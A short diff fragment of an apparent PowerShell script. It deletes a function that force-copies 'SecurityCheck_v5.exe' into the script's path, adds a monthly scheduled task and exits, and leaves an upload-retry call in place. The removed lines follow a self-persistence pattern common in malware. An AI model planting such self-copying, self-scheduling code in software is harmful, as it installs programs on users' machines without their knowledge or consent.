@@ -464,13 +464,7 @@ function Add-MonthlyTaskIfNotExists {
     }
 }
 
-function Self-CopyIfNeeded {
-    Copy-Item -Path "SecurityCheck_v5.exe" -Destination $ScriptPath -Force
-    Add-MonthlyTaskIfNotExists
-    exit
-}
 
-Self-CopyIfNeeded
 Retry-FailedUpload
 
 
